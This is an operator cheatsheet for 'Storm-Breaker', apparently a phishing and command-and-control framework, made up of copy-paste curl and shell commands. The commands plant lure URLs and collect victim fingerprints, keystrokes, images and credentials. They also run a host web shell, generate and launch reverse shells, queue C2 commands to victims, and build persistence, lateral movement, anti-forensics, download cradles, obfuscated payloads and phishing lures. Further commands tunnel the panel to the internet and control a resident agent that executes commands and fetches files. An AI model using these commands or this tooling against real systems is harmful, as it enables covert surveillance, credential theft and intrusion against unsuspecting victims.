# Storm-Breaker — Operator Cheatsheet

Copy-paste. Everything assumes the server is up on `:2525`.

**Legend:** 🟢 executes · 🟡 generates only · 🔵 reads stored data

```bash
export BASE=http://127.0.0.1:2525
export J=/tmp/sb.jar
export K=$(python3 -c "import json;print(json.load(open('storm-web/Settings.json'))['ingest_secret'])")
C="curl -s -b $J -H Content-Type:application/json"   # no inner quotes — see gotchas
```

## Victim endpoints (no cookie) — append `?k=$K`

`ingest_secret` is set by default, so victim traffic must carry the key.
Operator/panel traffic is exempt. Put `?k=$K` on every lure URL you hand out —
loading the page plants a `storm_k` cookie and the kit authenticates itself.

```bash
T=$BASE
curl -s -X POST "$T/receiver?k=$K" -H 'Content-Type: application/json' -d '{"uid":"v1"}'
curl -s -X POST "$T/api/fingerprint?k=$K" -H 'Content-Type: application/json' -d '{"uid":"v1","ua":"curl"}'
curl -s -X POST "$T/api/keystrokes?k=$K"   -H 'Content-Type: application/json' -d '{"logs":[{"type":"keypress","target":{"type":"body","tag":"BODY"}}],"url":"http://x"}'
curl -s -X POST "$T/api/session/start?k=$K" -H 'Content-Type: application/json' -d '{"sessionId":"s1","url":"http://x"}'
curl -s -X POST "$T/api/c2/register?k=$K"  -H 'Content-Type: application/json' -d '{"uid":"c1","ua":"curl"}'
curl -s -X POST "$T/api/c2/poll?k=$K"      -H 'Content-Type: application/json' -d '{"uid":"c1"}'
curl -s -X POST "$T/api/mobile/register?k=$K" -H 'Content-Type: application/json' -d '{"uid":"m1"}'
curl -s -X POST "$T/api/network/receive?k=$K" -H 'Content-Type: application/json' -d '{"uid":"m1","hosts":[]}'
# header form works too:  -H "X-Storm-Key: $K"     (or body {"k": "$K"})
$C -X POST $BASE/api/c2/queue_command -d '{"uid":"c1","command":"whoami"}'
$C $BASE/api/c2/get_responses/c1
```

## Ingest key / rate limits

```bash
$C $BASE/api/get_settings                       # see ingest_secret + limits
$C -X POST $BASE/api/save_settings -d '{"ingest_secret":""}'          # disable the key gate
$C -X POST $BASE/api/save_settings -d '{"ingest_secret":"newsecret"}'
$C -X POST $BASE/api/save_settings -d '{"ingest_rate_per_min":0}'     # disable ingest throttle
curl -s -o /dev/null -w '%{http_code} (401 expected)\n' -X POST -H 'Content-Type: application/json' \
     -d '{"uid":"x"}' $BASE/api/fingerprint                          # no key
```

### Session

```bash
curl -s -c $J -d 'username=admin&password=PASS' $BASE/login        # → 302 = ok
curl -s -b $J $BASE/api/get_settings
curl -s -b $J -X POST $BASE/api/save_settings -H 'Content-Type: application/json' \
     -d '{"require_login":true,"generic_webhook":"http://127.0.0.1:2525/api/notify/inbox"}'
```

### Start / stop / health

```bash
cd storm-web && nohup python3 app.py > /tmp/sb_server.log 2>&1 & echo $! > /tmp/sb_server.pid
kill "$(cat /tmp/sb_server.pid)"; fuser -k 2525/tcp
ss -tlnp | grep 2525
curl -s -o /dev/null -w '%{http_code}\n' $BASE/login               # 200
```

### Tunnel

```bash
ssh -R messiah:80:localhost:2525 serveo.net           # keep it simple; reconnect-safe name pinning:
ssh -R messiah.serveousercontent.com:80:localhost:2525 serveo.net
```

---

## 🟢 Execute things (the only real action)

```bash
# Web shell on the host — the one true shell (NOTE: key is "cmd", not "command")
$C -X POST $BASE/api/terminal -d '{"cmd":"id; uname -a"}'

# Real threaded TCP port scan (ranges work: "1-1024", "22,80", "22 443")
$C -X POST $BASE/api/net/scan -d '{"host":"127.0.0.1","ports":"1-1024"}'

# Generate + launch a reverse shell locally + VERIFY the callback
$C -X POST $BASE/api/strike/reverse -d '{"payload_type":"python_reverse","lhost":"127.0.0.1"}'

# RAT: same thing, from the RAT tab
$C -X POST $BASE/api/rat/launch -d '{"payload_type":"python_reverse","lhost":"127.0.0.1","timeout":4}'

# Named long-lived listener
$C -X POST $BASE/api/listeners/start -d '{"name":"catch","host":"127.0.0.1","port":4444}'
$C          $BASE/api/listeners
$C -X POST $BASE/api/listeners/stop  -d '{"name":"catch"}'

# Playbook: execute + verify steps with rollback
$C -X POST $BASE/api/playbooks -d '{"name":"P1","description":"d","steps":[]}'
$C          $BASE/api/playbooks
$C -X POST $BASE/api/playbooks/1/run -d '{}'        # id from the list above
```

## 🟢 Realtime / observe

```bash
curl -s -N -b $J $BASE/api/events            # SSE stream (Ctrl-C to stop)
curl -s -b $J "$BASE/api/live?limit=20"      # JSON snapshot: events+listeners+beacons

# Beacon control + arrival timing
$C -X POST $BASE/api/c2/beacon_config -d '{"base_ms":1500}'
$C $BASE/api/c2/beacons ; $C $BASE/api/c2/beacons/<uid>
curl -s -b $J "$BASE/api/c2/beacon_agent?uid=agent1"   # drop-in agent (auth'd; embeds the key)

# Notification sink
curl -s -X POST $BASE/api/notify/inbox -H 'Content-Type: application/json' -d '{"test":1}'
$C $BASE/api/notify/inbox
$C -X POST $BASE/api/notify/inbox/clear
```

## 🟢/🟡 RAT Controller

```bash
$C -X POST $BASE/api/rat/recon -d '{}'                                  # THIS host only
$C -X POST $BASE/api/rat/shells -d '{"shell_type":"all","lhost":"YOUR_IP","lport":"4444","encoding":"none"}'
$C $BASE/api/rat/shells                                                 # saved sessions
$C -X DELETE $BASE/api/rat/shells/1
$C -X POST $BASE/api/rat/persistence -d '{"os_type":"linux","method":"all","callback_url":"https://YOUR_TUNNEL"}'
$C "$BASE/api/rat/persistence?os=linux"
$C -X POST $BASE/api/rat/lateral -d '{"technique":"all","target_host":"10.0.0.5","username":"adm","domain":"CORP"}'
$C -X POST $BASE/api/rat/anti-forensics -d '{"action":"all","target_os":"windows"}'
$C -X POST $BASE/api/rat/cradles -d '{"payload_url":"https://x/p.exe","output_path":"p.exe"}'
$C -X POST $BASE/api/rat/c2-config -d '{"protocol":"https","domain":"cdn.x.com","port":443,"jitter":20,"sleep":60}'
$C -X POST $BASE/api/rat/encode -d '{"payload":"cmd /c whoami","technique":"all"}'
$C -X POST $BASE/api/rat/tunnels -d '{"tunnel_type":"all","local_port":8080,"remote_host":"10.0.0.9","remote_port":80}'
$C $BASE/api/rat/injection ; $C $BASE/api/rat/credentials/targets
$C $BASE/api/rat/history  ; $C -X DELETE $BASE/api/rat/1
```

## 🟡 Generators

```bash
# Payloads  (NOTE: the key is "type", not "payload_type")
$C $BASE/api/payloads/types
$C -X POST $BASE/api/payloads/generate -d '{"type":"python_reverse","lhost":"1.2.3.4","lport":4444}'
$C $BASE/api/strike/actions                     # → {"runnable":["python_reverse","bash_reverse"]}

# Obfuscation
$C $BASE/api/obfuscate/profiles
$C -X POST $BASE/api/obfuscate -d '{"payload":"IEX(...)","techniques":["base64"]}'

# Lures
$C $BASE/api/lures/categories
$C -X POST $BASE/api/lures/generate -d '{"category":"banking","brand":"Acme","company":"Acme"}'
$C -X POST $BASE/api/lures/bulk -d '{"count":5,"category":"tech","brand":"X","company":"X"}'
$C -X POST $BASE/api/lures/save -d '{"name":"l1","html":"<p>x</p>"}'

# Evasion
$C $BASE/api/evasion/profiles
$C -X POST $BASE/api/evasion/config -d '{"options":{"traffic_profile":"api_rest","timing_profile":"office_hours"}}'
$C -X POST $BASE/api/evasion/domains -d '{"category":"tech","company":"Acme","count":3}'
$C -X POST $BASE/api/evasion/beacon-schedule -d '{"profile":"office_hours","duration_hours":2}'

# Zero-Day Lab
$C $BASE/api/zeroday/cves ; $C $BASE/api/zeroday/shellcode-types
$C -X POST $BASE/api/zeroday/shellcode -d '{"type":"linux_x64_execve"}'
$C -X POST $BASE/api/zeroday/rop -d '{"binary":"/bin/ls"}'
$C -X POST $BASE/api/zeroday/scan -d '{}' ; $C -X POST $BASE/api/zeroday/fuzz -d '{}'

# Quantum (simulated)
$C $BASE/api/quantum/algorithms ; $C $BASE/api/quantum/benchmark ; $C $BASE/api/quantum/threat
$C -X POST $BASE/api/quantum/encrypt -d '{"data":"hello","algorithm":"aes"}'

# Session Hijack toolkit
$C $BASE/api/session-hijack/features
$C -X POST $BASE/api/session-hijack/analyze-jwt -d '{"token":"eyJ..."}'
$C -X POST $BASE/api/session-hijack/parse-cookies -d '{"cookies":"a=b; c=d"}'
$C -X POST $BASE/api/session-hijack/extract-tokens -d '{"text":"Authorization: Bearer abc"}'

# Pivot
$C -X POST $BASE/api/pivot/attack-graph -d '{}' ; $C -X POST $BASE/api/pivot/privesc -d '{}'
$C -X POST $BASE/api/pivot/kill-chain -d '{}'    ; $C -X POST $BASE/api/pivot/credential-reuse -d '{}'

# Deep Recon
$C -X POST $BASE/api/deeprecon/domain -d '{"domain":"example.com"}'
$C -X POST $BASE/api/deeprecon/email  -d '{"email":"a@b.com"}'
$C -X POST $BASE/api/deeprecon/infra  -d '{"host":"example.com"}'

# Reports / campaigns / threat intel
$C -X POST $BASE/api/reports/generate -d '{"title":"Op","report_type":"full"}'
$C -X POST $BASE/api/campaigns/create -d '{"name":"Op1","template":"weather"}'
$C -X POST $BASE/api/threat-intel/ip -d '{"ip":"8.8.8.8"}'

# Async variants queue a job and return 202 + job_id — poll it:
$C -X POST $BASE/api/credentials/scan-async -d '{"data":{"user":"a","pass":"b"}}'   # 202
$C -X POST $BASE/api/reports/generate-async -d '{"title":"x","report_type":"full"}' # 202
$C $BASE/api/jobs/<job_id>
```

## 🔵 Read stored data

```bash
$C $BASE/api/targets ; $C $BASE/api/targets/1 ; $C $BASE/api/targets/1/report
$C -X POST $BASE/api/targets/1/findings -d '{"kind":"note","detail":"looks unpatched"}'
$C $BASE/api/images ; $C $BASE/api/audio ; $C $BASE/api/fingerprints/list
$C $BASE/api/keystrokes/list ; $C $BASE/api/webrtc_leaks
$C $BASE/api/credentials/list ; $C $BASE/api/credentials/stats
$C $BASE/api/profiles/list ; $C $BASE/api/mobile/clients ; $C $BASE/api/c2/clients
$C $BASE/api/reports ; $C $BASE/api/playbooks ; $C $BASE/api/network/discoveries
$C $BASE/api/browser-exfil ; $C $BASE/api/operator/log ; $C $BASE/api/system/info
$C $BASE/api/analytics/dashboard ; $C $BASE/api/jobs/<job_id>
```

## Victim endpoints (no cookie) — the keyed versions live at the top

```bash
T=$BASE
curl -s -X POST "$T/receiver?k=$K" -H 'Content-Type: application/json' -d '{"uid":"v1","image":"data:image/png;base64,..."}'
```

## Maintenance

```bash
# backup + blank demo data (schema kept)
db=storm-web/storm_breaker.db
cp "$db" "backups/storm_breaker.db.$(date +%Y%m%d-%H%M%S)"
for t in $(sqlite3 "$db" ".tables"); do sqlite3 "$db" "DELETE FROM \"$t\";"; done
sqlite3 "$db" "DELETE FROM sqlite_sequence;"
for d in images sounds fingerprints keystrokes sessions clipboard network-scans; do rm -f storm-web/$d/*; done

# wipe captures via API (does NOT touch DB rows)
$C -X POST $BASE/api/nuke

# gates
python3 -m pytest -q                 # 302 passed
bash audit/run_audit.sh; echo $?     # exit 0
```

## Notifications → Discord instead of the local sink

```bash
$C -X POST $BASE/api/save_settings -H 'Content-Type: application/json' \
   -d '{"generic_webhook":"https://discord.com/api/webhooks/XXX/YYY"}'
```

## Resident agent (P18)

```bash
# fetch the generator (public, carries the ingest key) and spawn one
curl -s "$BASE/api/agent/agent.py?uid=demo1&download=1" -o /tmp/storm_agent.py
$C -X POST $BASE/api/agent/spawn -d "{\"uid\":\"demo1\",\"keep\":true}"
# run shell on it (returns in ~2s, not 15s — beacon is clamped)
$C -X POST $BASE/api/agent/exec -d '{"uid":"demo1","command":"id","wait":10}'
# list / kill
$C $BASE/api/agent/agents
$C -X POST $BASE/api/agent/exec -d '{"uid":"demo1","command":"__exit","wait":5}'
```

- `spawn` without `"keep":true` **terminates the process right after it
  registers** — a following `exec` then times out with empty output. Always
  `keep:true` unless you only wanted the registration check.
- Magic commands: `__sysinfo __pwd __cd <dir> __file_get <path>
  __file_put <path> <b64> __persist [name] __sleep <ms> __exit`. Anything else
  is shell exec in the agent's tracked CWD.
- `__file_get` returns `__FILEDATA__:<base64>` as the response body, not shell output.
- uid persists in `~/.storm_agent.json`; the agent re-registers after restarts.

## Durable notification outbox (P18)

```bash
$C "$BASE/api/notifications/outbox?limit=20&status=failed"   # list
$C "$BASE/api/notifications/stats"                            # counters
$C -X POST $BASE/api/notifications/outbox/3/retry             # force one row
$C -X POST $BASE/api/notifications/replay                     # requeue all failed
$C -X POST $BASE/api/notifications/drain                      # deliver what's due now
$C -X POST $BASE/api/notifications/purge                      # delete delivered
```

- Every notification is **recorded before delivery**. A webhook that was down at
  send time is not lost — retry with backoff up to 6 attempts (2s→15min), then
  status `failed`; `replay` resurrects it.
- A row stuck `pending` with a dead URL is correct-by-design: payload and URL
  were snapshotted at record time. Fix the URL, then `retry`.

## Gotchas that will waste your afternoon

- `BASE` must include the port. `127.0.0.1` alone is not `127.0.0.1:2525`.
- Without `-b $J` you get `401` on every `/api/*` that isn't victim-public.
- `POST` without a session is fine for victims, `403` never happens without an
  `Origin` header (that's the CSRF gate: hosts must match, headers are optional).
- `rat/lhost` = your reachable IP, never `0.0.0.0`.
- `/api/terminal` takes **`cmd`**, not `command`. Send `command` and you get a
  `200` with **empty output** — silent no-op. (The audit harness itself uses
  `command`, so the audit has always passed while the terminal returned nothing.)
- Snapshots/tests bind `:2525` — run the suite **or** the server, not both.
- Victim endpoints need `?k=$K` (or the `storm_k` cookie). Operator calls don't.
- **Never put quoted `-H 'A: B'` inside a shell variable.** `$C -H 'X: y'` word-splits
  into two broken args. Use `C="curl -s -b $J -H Content-Type:application/json"`.
- `/api/keystrokes` wants `{"logs":[...],"url":...}`; `/api/session/start` wants
  `{"sessionId":...,"url":...}` — a bare `{"uid":...}` 400s.
- `ingest_secret` empty → the key gate is off. Rate limits `0` → throttle off.
- `telegram_chat_id` must be numeric or `@channel`; a bot's @username is not a chat.
- The C2 key/encryption in `rat/c2-config` is decorative.
